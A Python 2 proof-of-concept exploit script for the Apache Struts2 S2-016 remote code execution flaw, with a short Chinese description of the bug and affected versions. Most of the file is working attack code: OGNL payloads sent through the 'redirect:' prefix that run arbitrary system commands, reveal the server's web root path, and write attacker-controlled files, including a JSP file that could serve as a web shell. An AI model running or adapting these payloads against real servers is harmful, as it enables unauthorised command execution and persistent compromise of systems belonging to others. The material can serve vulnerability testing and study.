#!/usr/bin/env python		
# coding:utf-8

"""
S2-016 远程代码执行漏洞

Desc
	在struts2中，DefaultActionMapper类支持以"action:"、"redirect:"、"redirectAction:"作为导航或是重定向前缀，
	但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。
Version
	2.0.0 - 2.3.15
Referer:
	- http://struts.apache.org/docs/s2-016.html
	- http://www.freebuf.com/articles/web/25337.html
"""

import requests
import urllib


def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/')

    command = "echo rivirsir"
    payloads = [
        # 执行命令payload
        '${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("%s").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}' % command,
        # 爆路径payload
        "${#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#a=#req.getSession(),#b=#a.getServletContext(),#c=#b.getRealPath('/'),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#c),#matt.getWriter().flush(),#matt.getWriter().close()}",

        '#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#b=new java.io.FileOutputStream(new java.lang.StringBuilder(#a.getRealPath("/")).append(@java.io.File@separator).append(#a.getParameter("name")).toString()),#b.write(#a.getParameter("t").getBytes()),#b.close(),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println("BINGO"),#genxor.flush(),#genxor.close()',
    	'#req=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#p=(#req.getRealPath("/")+"css3.jsp").replaceAll("\\", "/"),new java.io.BufferedWriter(new java.io.FileWriter(#p)).append(#req.getParameter("c")).close()}'   ]

    for payload in payloads:
        vulurl = url + '/index.action?redirect:%s' % urllib.quote(payload)
        try:
            resp = requests.get(vulurl, timeout=10)
            print resp.request.url
            if resp.text.startswith("rivirsir"):
                print resp.text
            # return True#
            if "/usr/local/tomcat/webapps/ROOT/" in resp.text:
                print resp.text
                #return True
        except Exception as e:
            print(e)
    return False


if __name__ == '__main__':
    print
    poc("http://vuln.com:8080/")
